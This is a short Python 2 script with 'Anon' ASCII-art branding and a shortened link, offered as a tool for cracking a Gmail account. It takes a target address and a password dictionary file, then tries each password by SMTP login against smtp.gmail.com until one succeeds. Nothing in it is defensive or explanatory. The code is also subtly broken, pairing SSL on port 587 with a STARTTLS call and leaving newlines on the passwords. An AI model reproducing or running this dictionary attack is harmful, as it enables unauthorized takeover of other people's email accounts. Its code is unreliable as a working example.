# -*- coding: utf-8 -*-
import smtplib


from time import sleep


print "     \                        "
print "    _ \   __ \   _ \  __ \    "
print "   ___ \  |   | (   | |   |   "
print " _/    _\_|  _|\___/ _|  _|   "
print "                              "
print " \    /\                      "
print "  )  ( ')                     "
print " (  /  )                      "
print "  \(__)|                      "
print "                              "
print "http://shorturl.at/nCD13      "
print "By: Anon script               "


smtpserver = smtplib.SMTP_SSL("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()



while True:

	user= raw_input("Please enter email :")
	usercheck = raw_input("Please enter the same email:")


	if user == usercheck:
		print "We're getting ready. Just a moment, please..\n\n"
		sleep(2)
		break
	elif user != usercheck:
		print "The email you entered does not match.\n\n"


passwfile = raw_input("Please enter a name for the dictionary file.: ")
file = open(passwfile, "r")

for password in file:
	try:
		smtpserver.login(user, password)
		print "[●] Password Found : %s" % password
		break
	except smtplib.SMTPAuthenticationError:
		print "[○] Password NotFound : %s" % password
input()
